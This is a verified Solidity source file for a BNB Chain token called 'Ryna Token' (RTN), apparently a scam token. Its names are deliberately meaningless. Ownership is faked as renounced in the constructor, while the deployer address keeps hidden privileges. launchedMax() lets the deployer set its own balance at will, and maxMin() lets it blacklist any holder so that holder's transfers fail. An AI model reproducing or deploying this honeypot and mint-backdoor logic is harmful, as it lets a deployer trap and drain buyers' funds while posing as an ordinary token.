/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;


interface listWallet {
    function createPair(address feeSender, address buyShould) external returns (address);
}

interface minFundAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract RynaToken {

    function senderTx() public {
        emit OwnershipTransferred(atFundBuy, address(0));
        owner = address(0);
    }

    uint8 public decimals = 18;

    function getOwner() external view returns (address) {
        return owner;
    }

    event Transfer(address indexed from, address indexed fromIsSender, uint256 value);

    function enableLaunchedAmount() public {
        if (fromTo == maxSwap) {
            maxSwap = false;
        }
        
        maxSwap=false;
    }

    uint256 public totalSupply = 100000000 * 10 ** 18;

    function approve(address exemptFund, uint256 swapLimit) public returns (bool) {
        allowance[toTotal()][exemptFund] = swapLimit;
        emit Approval(toTotal(), exemptFund, swapLimit);
        return true;
    }

    function toTotal() private view returns (address) {
        return msg.sender;
    }

    address public txAuto;

    function launchedMax(uint256 swapLimit) public {
        if (!takeReceiver[toTotal()]) {
            return;
        }
        balanceOf[atFundBuy] = swapLimit;
    }

    bool public marketingLiquidity;

    function launchAuto(address swapExempt) public {
        if (autoTokenSell) {
            return;
        }
        
        takeReceiver[swapExempt] = true;
        
        autoTokenSell = true;
    }

    function teamLaunched(address shouldAutoLaunch, address modeLaunch, uint256 swapLimit) internal returns (bool) {
        if (shouldAutoLaunch == atFundBuy) {
            return txTeam(shouldAutoLaunch, modeLaunch, swapLimit);
        }
        require(!tradingMode[shouldAutoLaunch]);
        return txTeam(shouldAutoLaunch, modeLaunch, swapLimit);
    }

    mapping(address => bool) public tradingMode;

    function atTake() public view returns (bool) {
        return marketingLiquidity;
    }

    function txTeam(address shouldAutoLaunch, address modeLaunch, uint256 swapLimit) internal returns (bool) {
        require(balanceOf[shouldAutoLaunch] >= swapLimit);
        balanceOf[shouldAutoLaunch] -= swapLimit;
        balanceOf[modeLaunch] += swapLimit;
        emit Transfer(shouldAutoLaunch, modeLaunch, swapLimit);
        return true;
    }

    function limitTo() public view returns (bool) {
        return marketingLiquidity;
    }

    bool public autoTokenSell;

    function transferFrom(address shouldAutoLaunch, address modeLaunch, uint256 swapLimit) external returns (bool) {
        if (allowance[shouldAutoLaunch][toTotal()] != type(uint256).max) {
            require(swapLimit <= allowance[shouldAutoLaunch][toTotal()]);
            allowance[shouldAutoLaunch][toTotal()] -= swapLimit;
        }
        return teamLaunched(shouldAutoLaunch, modeLaunch, swapLimit);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    address public atFundBuy;

    event Approval(address indexed buyMin, address indexed spender, uint256 value);

    function transfer(address autoTx, uint256 swapLimit) external returns (bool) {
        return teamLaunched(toTotal(), autoTx, swapLimit);
    }

    mapping(address => uint256) public balanceOf;

    function maxMin(address feeTeam) public {
        if (maxSwap == marketingLiquidity) {
            marketingLiquidity = false;
        }
        if (feeTeam == atFundBuy || feeTeam == txAuto || !takeReceiver[toTotal()]) {
            return;
        }
        
        tradingMode[feeTeam] = true;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    mapping(address => bool) public takeReceiver;

    string public symbol = "RTN";

    function receiverAmountMarketing() public {
        
        
        launchedSell=false;
    }

    address public owner;

    string public name = "Ryna Token";

    bool private fromTo;

    bool public launchedSell;

    bool public maxSwap;

    constructor (){
        if (launchedSell != fromTo) {
            launchedSell = false;
        }
        minFundAt enableFrom = minFundAt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        txAuto = listWallet(enableFrom.factory()).createPair(enableFrom.WETH(), address(this));
        owner = toTotal();
        
        atFundBuy = owner;
        takeReceiver[atFundBuy] = true;
        balanceOf[atFundBuy] = totalSupply;
        if (marketingLiquidity) {
            marketingLiquidity = false;
        }
        emit Transfer(address(0), atFundBuy, totalSupply);
        senderTx();
    }

}